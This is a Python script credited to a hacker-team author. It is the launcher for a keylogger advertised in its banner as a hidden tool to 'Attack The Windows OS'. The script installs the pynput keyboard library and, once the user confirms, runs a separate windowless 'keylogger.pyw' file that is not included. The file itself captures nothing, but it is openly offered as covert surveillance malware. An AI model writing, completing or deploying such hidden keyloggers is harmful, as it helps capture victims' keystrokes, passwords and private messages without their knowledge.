import time, os, sys
# INFO Author : Keyw0rds (Hidayat)
# Follow Me On Instagram : @_hidayt_ or @keyw00rd
# Team : AnonCyberTeam <3 - ELITE - TEH Squad Cyber


#COLOR
BL = "\033[1;36;40m"
RD = "\033[1;31;40m"
WT = "\033[1;37;40m"
GR = "\033[1;32;40m"
YW = "\033[1;33;40m"

b4nn3r = """
\033[1;36;40m  ------
\033[1;33;40m   .  .  \033[1;36;40m___
\033[1;33;40m  .|  |. \033[1;36;40m |  ___   _____
\033[1;33;40m  ||  || \033[1;36;40m | |   | |     |  \033[1;31;40m* \033[1;37;40mAttack The Windows OS
\033[1;33;40m  \\\()//\033[1;36;40m  | | \033[1;31;40m| \033[1;36;40m| |        \033[1;31;40m* \033[1;37;40mHidden Tools xD
\033[1;33;40m  .={}=. \033[1;36;40m | |___| |   ___  \033[1;31;40m* \033[1;37;40mCan Run In Device Active/ON
\033[1;33;40m / /`'\ \ \033[1;36;40m|    __ |     |  \033[1;31;40m* \033[1;37;40mKeyw0rds (c) ELITE
\033[1;33;40m ` \  / '\033[1;36;40m |_____| |_____|
\033[1;36;40m  ------
"""
def banner():
    os.system('clear')
    time.sleep(2)
    print(b4nn3r)

def check_pynput():
    try:
       import pynput
    except ImportError as check:
        print(f" {BL}[{RD}>{BL}] {WT}Pynput Not Installed...")
        time.sleep(1.5)
        print(f" {BL}[{YW}>{BL}] {WT}Install Pynput...")
        time.sleep(1.5)
        os.system('py -m pip install pynput')
    else:
        time.sleep(1.5)
        print(f" {BL}[{GR}>{BL}] {WT}Pynput Was Installed...")

def check_logging():
    try:
       import logging
    except ImportError as check:
        print(f" {BL}[{RD}>{BL}] {WT}Logging Not Installed...")
        time.sleep(1.5)
        print(f" {BL}[{YW}>{BL}] {WT}Install Logging...")
        time.sleep(1.5)
        os.system('py -m pip install logging')
    else:
        time.sleep(1.5)
        print(f" {BL}[{GR}>{BL}] {WT}Logging Was Installed...")
        time.sleep(1.5)

def check():
    banner()
    time.sleep(1)
    animation = "|/-\\"
    for load in range(30):
        time.sleep(0.2)
        process = animation[load % len(animation)]
        sys.stdout.write(f"\r {BL}[{YW}>{BL}] {WT}Checking ({process})")
        sys.stdout.flush()
    print("")
    check_pynput()
    check_logging()
    run = input(f" {BL}[{YW}>{BL}] {WT}Do You Want To Run Tools [{GR}Y{WT}/{RD}N{WT}]\n \n[{BL}root{GR}@{BL}keylogger{WT}]> ")
    if run=='Y':
      banner()
      print(f" {BL}[{GR}>{BL}] {WT}Logger Is Running...")
      time.sleep(2)
      print(f" {BL}[{GR}>{BL}] {WT}You Can Delete This Page For {RD} STOP{WT}...")
      os.system('py keylogger.pyw')
    elif run=='y':
      banner()
      print(f" {BL}[{GR}>{BL}] {WT}Logger Is Running...")
      time.sleep(2)
      print(f" {BL}[{GR}>{BL}] {WT}You Can Delete This Page For {RD} STOP{WT}...")
      os.system('py keylogger.pyw')
    elif run=='N':
      banner()
      time.sleep(1)
      print(f" {BL}[{YW}>{BL}] {WT}Thanks For Using This Tools...")
    elif run=='n':
      banner()
      time.sleep(1)
      print(f" {BL}[{YW}>{BL}] {WT}Thanks For Using This Tools...")
    else:
        banner()
        time.sleep(1)
        print(f" {BL}[{RD}{run}{BL}] {WT}Result For This Option ERROR")

def option_tools():
    banner()
    time.sleep(1)
    input_option = input(f"\n {BL}[{WT}1{BL}]{WT} Done {BL}| {BL}[{WT}2{BL}]{WT} Exit\n \n[{BL}root{GR}@{BL}keylogger{WT}]> ")
    if input_option=='1':
      check()
    elif input_option=='2':
      banner()
      time.sleep(1)
      print(f" {BL}[{YW}>{BL}] {WT}Thanks For Using This Tools...")
    else:
        banner()
        time.sleep(1)
        print(f" {BL}[{RD}{input_option}{BL}] {WT}Result For This Option ERROR")

option_tools()
